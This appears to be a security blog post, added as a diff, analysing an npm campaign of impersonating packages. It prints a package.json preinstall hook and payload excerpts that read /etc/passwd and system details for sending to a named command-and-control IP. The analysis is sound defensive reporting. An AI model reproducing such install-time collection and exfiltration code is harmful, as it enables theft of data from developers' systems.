@@ -1,0 +1,108 @@
+---
+publishDate: 2024-12-11T00:00:00Z
+title: 'npm - The Playground for Malicious Packages'
+image: /images/npm-the-malware-playground.png
+excerpt: Multiple npm packages impersonating popular package names are being used to distribute malware. We take a closer look at the campaign.
+tags:
+  - npm
+  - malware
+---
+
+Today our OSS package malware analysis bot picked up a new campaign targeting
+developers using npm. The campaign involves publishing multiple npm packages
+that impersonate popular package names. These packages are being used to
+collect basic system information and the contents of `/etc/passwd` file from
+the infected systems.
+
+Our system picked up the following packages with very similar behaviour
+matching common information gathering techniques:
+
+| Package Name    | Version |
+|-----------------|---------|
+| themes-vendor   | 0.0.1 |
+| x509-escaping   | 0.0.1 |
+| keycloak-server | 0.0.1 |
+| module-stub     | 0.0.1 |
+| keycloak-server | 0.0.3 |
+| postject-copy   | 0.0.0 |
+| micrometer-docs | 0.0.3 |
+| orbit-playroom  | 0.0.0 |
+| x509-escaping   | 0.0.0 |
+| weekendfe       | 0.0.1 |
+| themes-vendor   | 0.0.0 |
+
+`npm` promptly removed these packages from the registry. This was possible
+because no other package depended on these malicious packages. All packages
+had a similar payload that was being executed when the package was installed.
+For example, `themes-vendor` shipped a `package.json` file with the following
+
+```json
+{
+  "name": "themes-vendor",
+  "version": "0.0.1",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "node index.js"
+  },
+  "author": "",
+  "license": "ISC"
+}
+```
+
+The `preinstall` script in the `package.json` file executed the `index.js`
+script which in turn executed the following code:
+
+```javascript
+// [...]
+const apiHostname = '13.60.183.44';
+const apiPort = 5000;
+const apiPath = '/submit';
+
+// [...]
+let whoamiInfo = '';
+try {
+    // Execute the 'whoami' command and trim the output
+    whoamiInfo = execSync('cat /etc/passwd', { encoding: 'utf-8' }).trim();
+} catch (error) {
+    whoamiInfo = `Error executing whoami: ${error.message}`;
+}
+
+// [...]
+const deviceInfo = {
+    platform: os.platform(),
+    release: os.release(),
+    hostname: os.hostname(),
+    arch: os.arch(),
+    userInfo: os.userInfo(),
+    networkInterfaces: os.networkInterfaces(),
+    whoamiinfo: whoamiInfo,
+    user: "themes-vendor",
+};
+```
+
+The command and control IP `13.60.183.44` belongs to AWS which along with the
+nature of the payload suggests that this campaign is a possible red-team or
+security research activity.
+
+```shell
+NetRange:       13.60.0.0 - 13.63.255.255
+CIDR:           13.60.0.0/14
+NetName:        AMAZO-4
+NetHandle:      NET-13-60-0-0-1
+Parent:         NET13 (NET-13-0-0-0-0)
+NetType:        Direct Allocation
+OriginAS:
+Organization:   Amazon.com, Inc. (AMAZO-4)
+RegDate:        2022-10-11
+Updated:        2022-10-11
+Ref:            https://rdap.arin.net/registry/ip/13.60.0.0
+```
+
+## Conclusion
+
+This campaign appears to be a playground for the attackers or possible
+red-teamers to test their malware distribution techniques. While the payload
+does not appear to be sophisticated or damaging, it still highlights the very
+real threat of malicious packages impersonating popular package names.
